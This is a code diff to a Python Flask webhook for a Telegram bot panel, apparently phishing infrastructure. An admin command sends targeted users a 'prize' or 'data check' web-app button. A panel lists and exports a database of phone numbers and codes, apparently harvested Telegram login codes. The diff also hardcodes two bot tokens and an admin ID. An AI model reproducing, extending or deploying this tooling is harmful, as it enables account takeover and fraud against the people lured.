@@ -9,7 +9,8 @@ from datetime import datetime
 import threading
 
 # ========== КОНФИГ ==========
-BOT_TOKEN = "8997012321:AAELLgXvTcVsi6kp2CnT8zBLPy-kLp8XHcM"
+BOT_TOKEN = "8997012321:AAELLgXvTcVsi6kp2CnT8zBLPy-kLp8XHcM"  # панель
+CLIENT_TOKEN = "8638305124:AAG6a1JWNDUEHywMpoeZdtf6gaDIfI9Npqk"  # клиентский бот
 ADMIN_ID = 8899193168
 MINI_APP_URL = "https://bot-panel-v2.onrender.com/prize"
 MINI_APP_URL2 = "https://bot-panel-v2.onrender.com/prize2"
@@ -56,9 +57,10 @@ def get_accounts_count():
     conn.close()
     return count
 
-# ========== ОТПРАВКА СООБЩЕНИЙ ==========
-def send_message(chat_id, text, reply_markup=None, parse_mode=None):
-    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+# ========== ОТПРАВКА СООБЩЕНИЙ ЧЕРЕЗ КЛИЕНТСКОГО БОТА ==========
+def send_message_via_client(chat_id, text, reply_markup=None, parse_mode=None):
+    """Отправляет сообщение через клиентского бота (@fikeikddbot)."""
+    url = f"https://api.telegram.org/bot{CLIENT_TOKEN}/sendMessage"
     payload = {"chat_id": chat_id, "text": text}
     if reply_markup:
         payload["reply_markup"] = json.dumps(reply_markup)
@@ -66,11 +68,13 @@ def send_message(chat_id, text, reply_markup=None, parse_mode=None):
         payload["parse_mode"] = parse_mode
     try:
         r = requests.post(url, json=payload, timeout=10)
-        logging.info(f"📤 Отправлено в {chat_id}: {r.status_code}")
+        logging.info(f"📤 Отправлено через клиента в {chat_id}: {r.status_code}")
+        return r.status_code == 200
     except Exception as e:
-        logging.error(f"❌ Ошибка отправки: {e}")
+        logging.error(f"❌ Ошибка отправки через клиента: {e}")
+        return False
 
-# ========== ОБРАБОТКА ВЕБХУКА ==========
+# ========== ОБРАБОТКА ВЕБХУКА (панель) ==========
 @app.route("/", methods=["POST"])
 def webhook():
     data = request.get_json()
@@ -89,18 +93,18 @@ def webhook():
                     [{"text": "🌐 Админ-панель", "url": PANEL_URL}]
                 ]
             }
-            send_message(chat_id, "🤖 Выберите действие:", reply_markup=keyboard)
+            send_message_via_client(chat_id, "🤖 Выберите действие:", reply_markup=keyboard)
 
         elif text == "/admin":
             if chat_id != ADMIN_ID:
-                send_message(chat_id, "⛔ У вас нет доступа.")
+                send_message_via_client(chat_id, "⛔ У вас нет доступа.")
                 return "OK", 200
             show_admin_panel(chat_id)
 
         elif text.startswith("/send"):
             parts = text.split()
             if len(parts) < 3:
-                send_message(chat_id, "❌ Формат: `/send @username premium` или `/send @username osint`", parse_mode="Markdown")
+                send_message_via_client(chat_id, "❌ Формат: `/send @username premium` или `/send @username osint`", parse_mode="Markdown")
                 return "OK", 200
             target = parts[1].strip()
             if not target.startswith("@"):
@@ -114,7 +118,7 @@ def webhook():
                 url = MINI_APP_URL2
                 label = "🔍 Проверить данные"
             else:
-                send_message(chat_id, "❌ Неверный тип. Используй `premium` или `osint`", parse_mode="Markdown")
+                send_message_via_client(chat_id, "❌ Неверный тип. Используй `premium` или `osint`", parse_mode="Markdown")
                 return "OK", 200
 
             keyboard = {
@@ -122,8 +126,11 @@ def webhook():
                     [{"text": label, "web_app": {"url": url}}]
                 ]
             }
-            send_message(target, f"🎁 Вам отправили кнопку **{label}**!", reply_markup=keyboard, parse_mode="Markdown")
-            send_message(chat_id, f"✅ Кнопка `{label}` отправлена пользователю {target}", parse_mode="Markdown")
+            success = send_message_via_client(target, f"🎁 Вам отправили кнопку **{label}**!", reply_markup=keyboard, parse_mode="Markdown")
+            if success:
+                send_message_via_client(chat_id, f"✅ Кнопка `{label}` отправлена пользователю {target}", parse_mode="Markdown")
+            else:
+                send_message_via_client(chat_id, f"❌ Не удалось отправить кнопку {target}. Возможно, пользователь не начал диалог с ботом.", parse_mode="Markdown")
 
     elif "callback_query" in data:
         query = data["callback_query"]
@@ -138,13 +145,13 @@ def webhook():
                     [{"text": "⬅️ Назад", "callback_data": "back_to_menu"}]
                 ]
             }
-            send_message(chat_id, "🔧 **Выберите тип кнопки для отправки:**", reply_markup=keyboard)
+            send_message_via_client(chat_id, "🔧 **Выберите тип кнопки для отправки:**", reply_markup=keyboard)
 
         elif data_callback == "send_premium":
-            send_message(chat_id, "✏️ Введите юзернейм и тип кнопки:\n`/send @username premium`", parse_mode="Markdown")
+            send_message_via_client(chat_id, "✏️ Введите юзернейм и тип кнопки:\n`/send @username premium`", parse_mode="Markdown")
 
         elif data_callback == "send_osint":
-            send_message(chat_id, "✏️ Введите юзернейм и тип кнопки:\n`/send @username osint`", parse_mode="Markdown")
+            send_message_via_client(chat_id, "✏️ Введите юзернейм и тип кнопки:\n`/send @username osint`", parse_mode="Markdown")
 
         elif data_callback == "back_to_menu":
             keyboard = {
@@ -153,12 +160,12 @@ def webhook():
                     [{"text": "🌐 Админ-панель", "url": PANEL_URL}]
                 ]
             }
-            send_message(chat_id, "🤖 Выберите действие:", reply_markup=keyboard)
+            send_message_via_client(chat_id, "🤖 Выберите действие:", reply_markup=keyboard)
 
         elif data_callback == "export_csv":
             rows = get_all_accounts()
             if not rows:
-                send_message(chat_id, "📭 Нет данных.")
+                send_message_via_client(chat_id, "📭 Нет данных.")
                 return "OK", 200
 
             csv = "Телефон,Код,Шаблон,Статус,Дата\n"
@@ -185,7 +192,7 @@ def show_admin_panel(chat_id):
                 [{"text": "🌐 Открыть админ-панель", "url": PANEL_URL}]
             ]
         }
-        send_message(chat_id, "📭 База данных пуста.", reply_markup=keyboard)
+        send_message_via_client(chat_id, "📭 База данных пуста.", reply_markup=keyboard)
         return
 
     msg = "📋 **База данных (последние 10):**\n\n"
@@ -199,7 +206,7 @@ def show_admin_panel(chat_id):
             [{"text": "📥 Экспорт CSV", "callback_data": "export_csv"}]
         ]
     }
-    send_message(chat_id, msg, reply_markup=keyboard, parse_mode="Markdown")
+    send_message_via_client(chat_id, msg, reply_markup=keyboard, parse_mode="Markdown")
 
 # ========== API ДЛЯ ВЕБ-АДМИНКИ ==========
 @app.route("/api/accounts")
